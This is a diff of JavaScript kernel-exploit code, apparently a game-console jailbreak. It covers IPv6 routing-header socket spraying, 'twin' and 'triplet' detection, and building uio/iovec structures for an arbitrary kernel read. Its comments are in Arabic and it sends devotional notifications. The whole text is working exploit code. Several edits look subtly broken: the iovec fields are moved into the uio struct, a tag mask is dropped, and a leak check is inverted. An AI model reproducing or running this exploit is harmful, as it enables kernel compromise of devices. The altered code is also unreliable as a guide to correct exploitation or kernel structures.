@@ -770,20 +770,14 @@ function fill_buffer_64(buf, val, len) {
 }
 function find_twins() {
   var count = 0;
+  var val, i, j;
   var zeroMemoryCount = 0;
-  var spray_add = spray_rthdr.add(0x04);
-  var leak_add  = leak_rthdr.add(0x04);
-
   twins[0] = -1;
   twins[1] = -1;
-
+  var spray_add = spray_rthdr.add(0x04);
+  var leak_add = leak_rthdr.add(0x04);
   while (count < MAX_ROUNDS_TWIN) {
-    // مراقبة حالة الذاكرة (لو حابب تحتفظ بيها)
-    if (typeof debugging !== 'undefined' &&
-        debugging.info &&
-        debugging.info.memory &&
-        debugging.info.memory.available === 0) {
-
+    if (typeof debugging !== 'undefined' && debugging.info && debugging.info.memory && debugging.info.memory.available === 0) {
       zeroMemoryCount++;
       if (zeroMemoryCount >= 5) {
         cleanup();
@@ -792,89 +786,64 @@ function find_twins() {
     } else {
       zeroMemoryCount = 0;
     }
-
-    // spray: نكتب tag + index لكل socket صالح
-    for (var i = 0; i < ipv6_socks.length; i++) {
-      if (ipv6_socks[i].eq(BigInt_Error)) continue;
+    for (i = 0; i < ipv6_socks.length; i++) {
+      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
 
       write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add); // memory barrier
+      read32(spray_add); // تعديل رقم 2 (memory barrier)
+
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
-
-    // leak: نقرأ مرة واحدة لكل socket ونحاول نلاقي توأم
-    for (var i = 0; i < ipv6_socks.length; i++) {
+    for (i = 0; i < ipv6_socks.length; i++) {
       if (ipv6_socks[i].eq(BigInt_Error)) continue;
-
-      write32(leak_add, 0);
+      write32(leak_add, 0); // تعديل رقم 4
       get_rthdr(ipv6_socks[i], leak_rthdr, 8);
-
-      var val = read32(leak_add);
-      var j   = val & 0xFFFF;
-
-      // نتأكد إن الـ tag مطابق وإن الـ index منطقي ومش نفس الـ socket
-      if ((val & 0xFFFF0000) === (RTHDR_TAG & 0xFFFF0000) &&
-          i !== j &&
-          j >= 0 &&
-          j < ipv6_socks.length) {
-
+      val = read32(leak_add);
+      j = val & 0xFFFF;
+      if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j >= 0 && j < ipv6_socks.length) {
         twins[0] = i;
         twins[1] = j;
         log(' TWINS : [' + i + '] [' + j + ']');
         return true;
       }
     }
-
     count++;
   }
-
   twins[0] = -1;
   twins[1] = -1;
   return false;
 }
 function find_triplet(master, other, iterations) {
-  if (typeof iterations === 'undefined') {
-    iterations = MAX_ROUNDS_TRIPLET;
-  }
-
-  var count    = 0;
+  if (typeof iterations === 'undefined') iterations = MAX_ROUNDS_TRIPLET;
+  var count = 0;
+  var val, i, j;
   var spray_add = spray_rthdr.add(0x04);
-  var leak_add  = leak_rthdr.add(0x04);
-
+  var leak_add = leak_rthdr.add(0x04);
   while (count < iterations) {
-    // 1) spray على كل socket ما عدا master و other
-    for (var i = 0; i < ipv6_socks.length; i++) {
+    for (i = 0; i < ipv6_socks.length; i++) {
       if (i === master || i === other) continue;
-      if (ipv6_socks[i].eq(BigInt_Error)) continue;
+      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
 
       write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add); // memory barrier
+      read32(spray_add); // تعديل رقم 2
+
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
-
-    // 2) leak من master
-    write32(leak_add, 0);
+    write32(leak_add, 0); // تعديل رقم 4
     get_rthdr(ipv6_socks[master], leak_rthdr, 8);
+    val = read32(leak_add);
+    j = val & 0xFFFF;
 
-    var val = read32(leak_add);
-    var j   = val & 0xFFFF;
-
-    // منع false positives: لو رجع master أو other اعتبرها ضوضاء
+    // تعديل رقم 3 (منع false positives)
     if (j === master || j === other) {
       count++;
       continue;
     }
-
-    // 3) تحقق من الـ tag والـ index
-    if ((val & 0xFFFF0000) === (RTHDR_TAG & 0xFFFF0000) &&
-        j >= 0 &&
-        j < ipv6_socks.length) {
+    if ((val & 0xFFFF0000) === RTHDR_TAG && j >= 0 && j < ipv6_socks.length) {
       return j;
     }
-
     count++;
   }
-
   return -1;
 }
 function init_threading() {
@@ -1113,8 +1082,8 @@ function jailbreak() {
   cleanup(false);
   show_success();
   run_binloader();
-  utils.notify('Subhan Allah wa biHamdih, Subhan Allah al-Azeem');
-  utils.notify('[Stability by DV M. ELHOUT]');
+  utils.notify('< Sobhan allh Wabe Hamdh Sobhan allh alazeem >');
+  utils.notify('[ Stability by DV M.ELHOUT ]');
 }
 function safe_fhold_fd(fd, label) {
   if (fd < 0) {
@@ -1489,22 +1458,15 @@ function kreadslow64_safe(address) {
   return read64(buffer);
 }
 function build_uio(uio, uio_iov, uio_td, read, addr, size) {
-  //
-  // uio structure
-  //
-  write64(uio.add(0x00), uio_iov);      // uio_iov (pointer to iovec array)
-  write64(uio.add(0x08), UIO_IOV_NUM);  // uio_iovcnt
+  write64(uio.add(0x00), uio_iov); // uio_iov
+  write64(uio.add(0x08), UIO_IOV_NUM); // uio_iovcnt
   write64(uio.add(0x10), BigInt_Error); // uio_offset
-  write64(uio.add(0x18), size);         // uio_resid
+  write64(uio.add(0x18), size); // uio_resid
   write32(uio.add(0x20), UIO_SYSSPACE); // uio_segflg
   write32(uio.add(0x24), read ? UIO_WRITE : UIO_READ); // uio_rw
-  write64(uio.add(0x28), uio_td);       // uio_td
-
-  //
-  // iovec structure (MUST be written inside uio_iov, not inside uio)
-  //
-  write64(uio_iov.add(0x00), addr);     // iov_base
-  write64(uio_iov.add(0x08), size);     // iov_len
+  write64(uio.add(0x28), uio_td); // uio_td
+  write64(uio.add(0x30), addr); // iov_base
+  write64(uio.add(0x38), size); // iov_len
 }
 // =========================
 //  GLOBAL EXPLOIT CONSTANTS
@@ -1548,11 +1510,6 @@ function kreadslow(addr, size) {
       return BigInt_Error;
     }
   }
-
-  for (let i = 0; i < UIO_THREAD_NUM; i++) {
-    write64(leak_buffers[i], LEAK_TAG);
-  }
-  
   write32(sockopt_val_buf, size);
   setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
   write(new BigInt(uio_sock_1), tmp, size);
@@ -1623,19 +1580,14 @@ function kreadslow(addr, size) {
     read(new BigInt(iov_sock_0), tmp, 1);
   }
   read(new BigInt(uio_sock_0), tmp, size);
-
   var leak_buffer = new BigInt(0);
-
   for (var k = 0; k < UIO_THREAD_NUM; k++) {
-      read(new BigInt(uio_sock_0), leak_buffers[k], size);
-
-      var val = read64(leak_buffers[k]);
-
-      if (val.eq(LEAK_TAG)) {
-          leak_buffer = leak_buffers[k].add(0);
-          triplets[1] = find_triplet(triplets[0], -1);
-          break;
-      }
+    read(new BigInt(uio_sock_0), leak_buffers[k], size);
+    var val = read64(leak_buffers[k]);
+    if (!val.eq(LEAK_TAG)) {
+      triplets[1] = find_triplet(triplets[0], -1);
+      leak_buffer = leak_buffers[k].add(0);
+    }
   }
   wait_uio_writev();
   write(new BigInt(iov_sock_1), tmp, 1);
